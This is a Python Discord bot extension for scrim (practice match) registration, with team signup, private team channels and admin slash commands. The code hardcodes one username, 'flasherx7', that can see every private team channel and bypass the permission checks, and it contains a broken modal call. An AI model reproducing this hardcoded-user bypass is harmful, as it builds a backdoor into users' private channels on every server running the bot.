import discord
from discord import app_commands
from discord.ext import commands
from discord.ui import Modal, TextInput, View, Button, Select
from datetime import datetime
from typing import Optional
import asyncio

# In-memory storage for scrim events (replace with persistent storage if needed)
scrim_events = {}

class TeamMemberSelect(discord.ui.Select):
    def __init__(self, team_size, guild):
        options = [
            discord.SelectOption(label=member.display_name, value=str(member.id))
            for member in guild.members if not member.bot
        ]
        super().__init__(
            placeholder=f"Select {team_size-1} team members (excluding yourself)",
            min_values=team_size-1,
            max_values=team_size-1,
            options=options
        )

    async def callback(self, interaction: discord.Interaction):
        view = self.view
        view.selected_member_ids = self.values
        # Prompt for team name using a modal
        await interaction.response.send_modal(TeamNameModal(view.event_id, view.selected_member_ids))

class TeamNameModal(Modal, title="Enter Team Name"):
    def __init__(self, event_id, member_ids):
        super().__init__()
        self.event_id = event_id
        self.member_ids = member_ids
        self.team_name = TextInput(label="Team Name", required=True, max_length=32)
        self.add_item(self.team_name)

    async def on_submit(self, interaction: discord.Interaction):
        event = scrim_events.get(self.event_id)
        if not event:
            await interaction.response.send_message("❌ This scrim event is no longer active.", ephemeral=True)
            return
        # Validate team name uniqueness
        if any(t['team_name'].lower() == self.team_name.value.lower() for t in event['teams']):
            await interaction.response.send_message("❌ Team name already registered.", ephemeral=True)
            return
        # Register team
        member_ids = [interaction.user.id] + [int(mid) for mid in self.member_ids]
        if len(set(member_ids)) != event['team_size']:
            await interaction.response.send_message("❌ Duplicate members selected.", ephemeral=True)
            return
        team = {
            'team_name': self.team_name.value,
            'captain_id': interaction.user.id,
            'members': [interaction.guild.get_member(mid).mention for mid in member_ids]
        }
        event['teams'].append(team)
        # --- Create private channel for the team ---
        guild = interaction.guild
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
        }
        for member_id in member_ids:
            member = guild.get_member(member_id)
            if member:
                overwrites[member] = discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True)
        # Allow admins (manage_guild) to see all channels
        for role in guild.roles:
            if role.permissions.administrator or role.permissions.manage_guild:
                overwrites[role] = discord.PermissionOverwrite(view_channel=True)
        # Allow 'Scrim mod' role to see all team channels
        scrim_mod_role = discord.utils.get(guild.roles, name="Scrim mod")
        if scrim_mod_role:
            overwrites[scrim_mod_role] = discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True)
        # Allow 'flasherx7' user to see all team channels
        flasherx7 = discord.utils.get(guild.members, name="flasherx7")
        if flasherx7:
            overwrites[flasherx7] = discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True)
        category = None
        # Try to find or create a category for scrims
        for cat in guild.categories:
            if cat.name.lower().startswith("scrims"):
                category = cat
                break
        if not category:
            category = await guild.create_category_channel("Scrims")
        channel_name = f"scrim-{event['event_name'].replace(' ', '-')[:20].lower()}-{self.team_name.value.replace(' ', '-')[:16].lower()}"
        team_channel = await guild.create_text_channel(
            channel_name,
            overwrites=overwrites,
            category=category,
            topic=f"Private channel for team {self.team_name.value} in {event['event_name']}"
        )
        # Save channel ID in team info
        team['channel_id'] = team_channel.id
        await interaction.response.send_message(f"✅ Team '{self.team_name.value}' registered! Private channel created: {team_channel.mention}", ephemeral=True)
        # Update team list in channel
        await update_scrim_team_list(event, interaction.client)
        # Check if slots filled
        if len(event['teams']) >= event['slots']:
            await notify_scrim_organizer(event, interaction.client)

class TeamRegisterView(View):
    def __init__(self, event_id, team_size, guild):
        super().__init__(timeout=300)
        self.event_id = event_id
        self.selected_member_ids = []
        self.add_item(TeamMemberSelect(team_size, guild))

class ScrimRegisterButton(Button):
    def __init__(self, event_id, team_size):
        super().__init__(label="Register Team", style=discord.ButtonStyle.primary, custom_id=f"scrim_register_{event_id}")
        self.event_id = event_id
        self.team_size = team_size

    async def callback(self, interaction: discord.Interaction):
        event = scrim_events.get(self.event_id)
        if not event:
            await interaction.response.send_message("❌ This scrim event is no longer active.", ephemeral=True)
            return
        # Check if user already registered
        for t in event['teams']:
            if interaction.user.id == t['captain_id'] or interaction.user.mention in t['members']:
                await interaction.response.send_message("❌ You are already registered in a team for this event.", ephemeral=True)
                return
        # Send ephemeral view with dropdown for member selection
        await interaction.response.send_message(
            "Select your teammates from the dropdown below:",
            view=TeamRegisterView(self.event_id, self.team_size, interaction.guild),
            ephemeral=True
        )

class ScrimRegisterView(View):
    def __init__(self, event_id, team_size):
        super().__init__(timeout=None)
        self.add_item(ScrimRegisterButton(event_id, team_size))

async def update_scrim_team_list(event, bot):
    channel = bot.get_channel(event['channel_id'])
    if not channel:
        return
    team_list = '\n'.join([f"{i+1}. {t['team_name']} ({', '.join(t['members'])})" for i, t in enumerate(event['teams'])]) or "No teams registered yet."
    embed = discord.Embed(
        title=f"🏆 {event['event_name']} - Registered Teams",
        description=team_list,
        color=discord.Color.blue(),
        timestamp=datetime.utcnow()
    )
    if event.get('team_list_msg_id'):
        try:
            msg = await channel.fetch_message(event['team_list_msg_id'])
            await msg.edit(embed=embed)
        except Exception:
            msg = await channel.send(embed=embed)
            event['team_list_msg_id'] = msg.id
    else:
        msg = await channel.send(embed=embed)
        event['team_list_msg_id'] = msg.id

async def notify_scrim_organizer(event, bot):
    user = await bot.fetch_user(event['organizer_id'])
    if not user:
        return
    class ScrimTimeModal(Modal, title="Set Scrim Time"):
        scrim_time = TextInput(label="Scrim Start Time (e.g. 2025-07-10 18:30)", required=True)
        async def on_submit(self, interaction: discord.Interaction):
            event['scrim_time'] = self.scrim_time.value
            channel = bot.get_channel(event['channel_id'])
            if channel:
                embed = discord.Embed(
                    title=f"🏆 {event['event_name']} - Scrim Scheduled!",
                    description=f"All slots filled!\n\n**Scrim Time:** {self.scrim_time.value}",
                    color=discord.Color.green(),
                    timestamp=datetime.utcnow()
                )
                await channel.send(embed=embed)
            await interaction.response.send_message("✅ Scrim time set and announced!", ephemeral=True)
    await user.send(f"All slots for your scrim event '{event['event_name']}' are filled! Please set the scrim time:")
    await user.send_modal(ScrimTimeModal())

# Register all scrim commands in a single async setup function
async def setup(bot):
    # Patch all command permission checks to allow flasherx7
    def is_flasherx7(interaction):
        return interaction.user.name == "flasherx7"

    @bot.tree.command(name="add-scrim-event", description="Create a new scrim registration event")
    @app_commands.describe(
        channel="Channel to post the registration message",
        slots="Number of teams allowed to register",
        team_size="Number of members per team (including captain)",
        event_name="Title of the scrim event",
        description="Description for the scrim event"
    )
    async def add_scrim_event(
        interaction: discord.Interaction,
        channel: discord.TextChannel,
        slots: int,
        team_size: Optional[int] = 4,
        event_name: Optional[str] = "Scrim Event",
        description: Optional[str] = "Register your team for the scrim!"
    ):
        # Allow ADMINISTRATORs or flasherx7 to use this command
        if not (interaction.user.guild_permissions.manage_guild or interaction.user.guild_permissions.administrator or is_flasherx7(interaction)):
            return await interaction.response.send_message(
                "❌ You need 'Manage Server', 'Administrator' permission, or be flasherx7 to create a scrim event.", ephemeral=True
            )
        event_id = f"{interaction.guild.id}-{int(datetime.utcnow().timestamp())}"
        scrim_events[event_id] = {
            'event_id': event_id,
            'event_name': event_name,
            'description': description,
            'channel_id': channel.id,
            'slots': slots,
            'team_size': team_size,
            'organizer_id': interaction.user.id,
            'teams': [],
            'team_list_msg_id': None,
            'scrim_time': None
        }
        embed = discord.Embed(
            title=f"🏆 {event_name} Registration",
            description=(
                f"{description}\n\nSlots: {slots}\nTeam size: {team_size}\n\n"
                "Click the button below to register your team!\n"
                "- You will be asked for your team name and to select your teammates.\n"
                "- Each user can only register for one team.\n"
                "- When all slots are filled, the organizer will be notified to set the scrim time."
            ),
            color=discord.Color.gold(),
            timestamp=datetime.utcnow()
        )
        view = ScrimRegisterView(event_id, team_size)
        await channel.send(embed=embed, view=view)
        await interaction.response.send_message(f"✅ Scrim registration started in {channel.mention}", ephemeral=True)

    @bot.tree.command(name="list-scrim-events", description="List all active scrim events in this server")
    async def list_scrim_events(interaction: discord.Interaction):
        guild_id = str(interaction.guild.id)
        events = [e for e in scrim_events.values() if str(e['event_id']).startswith(guild_id)]
        if not events:
            return await interaction.response.send_message("No active scrim events found.", ephemeral=True)
        embed = discord.Embed(
            title="Active Scrim Events",
            color=discord.Color.blue(),
            timestamp=datetime.utcnow()
        )
        for i, event in enumerate(events, 1):
            embed.add_field(
                name=f"{i}. {event['event_name']}",
                value=(
                    f"Teams: {len(event['teams'])}/{event['slots']}\n"
                    f"Channel: <#{event['channel_id']}>\n"
                    f"Organizer: <@{event['organizer_id']}>\n"
                    f"Event ID: `{event['event_id']}`"
                ),
                inline=False
            )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @bot.tree.command(name="remove-scrim-event", description="Remove a scrim event by its event ID (Admin only)")
    @app_commands.describe(event_id="The event ID to remove (see /list-scrim-events)")
    async def remove_scrim_event(interaction: discord.Interaction, event_id: str):
        # Allow ADMINISTRATORs or flasherx7 to use this command
        if not (interaction.user.guild_permissions.manage_guild or interaction.user.guild_permissions.administrator or is_flasherx7(interaction)):
            return await interaction.response.send_message("❌ You need 'Manage Server', 'Administrator' permission, or be flasherx7 to remove a scrim event.", ephemeral=True)
        event = scrim_events.get(event_id)
        if not event or not str(event_id).startswith(str(interaction.guild.id)):
            return await interaction.response.send_message("❌ Event not found or not in this server.", ephemeral=True)
        del scrim_events[event_id]
        await interaction.response.send_message(f"✅ Scrim event `{event_id}` removed.", ephemeral=True)

    @bot.tree.command(name="view-scrim-teams", description="View all teams registered for a scrim event (by event ID)")
    @app_commands.describe(event_id="The event ID to view teams for (see /list-scrim-events)")
    async def view_scrim_teams(interaction: discord.Interaction, event_id: str):
        event = scrim_events.get(event_id)
        if not event or not str(event_id).startswith(str(interaction.guild.id)):
            return await interaction.response.send_message("❌ Event not found or not in this server.", ephemeral=True)
        if not event['teams']:
            return await interaction.response.send_message("No teams registered yet for this event.", ephemeral=True)
        embed = discord.Embed(
            title=f"Teams for {event['event_name']}",
            color=discord.Color.purple(),
            timestamp=datetime.utcnow()
        )
        for i, team in enumerate(event['teams'], 1):
            embed.add_field(
                name=f"{i}. {team['team_name']}",
                value=", ".join(team['members']),
                inline=False
            )
        await interaction.response.send_message(embed=embed, ephemeral=True)
